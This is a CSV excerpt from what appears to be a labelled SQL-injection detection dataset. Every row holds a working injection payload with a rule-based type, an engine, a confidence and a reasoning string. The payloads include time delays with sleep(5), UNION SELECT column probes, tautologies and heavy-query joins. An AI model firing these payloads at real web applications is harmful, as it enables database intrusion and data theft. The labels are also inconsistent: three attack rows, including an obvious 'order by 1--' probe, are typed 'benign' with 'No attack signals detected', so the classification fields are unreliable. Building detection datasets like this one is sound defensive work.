row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5700,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 'zaru' = 'zaru",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5701,"1 ) where 7684 = 7684 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,7684 = 7684 and detected — boolean_blind injection (priority 8) on generic,rule-based
5702,1' ) and 2577 = 7094,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5703,"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5704,-1587' ) or 8339 = 5540,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5705,-3748' where 9292 = 9292 or 3337 = 2859#,1,,boolean_blind,generic,0.95,9292 = 9292 or detected — boolean_blind injection (priority 8) on generic,rule-based
5706,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5707,"1 ) where 5385 = 5385 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5708,"1"" ) or sleep ( 5 ) and ( ""xgtk"" = ""xgtk",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5709,-9014' order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
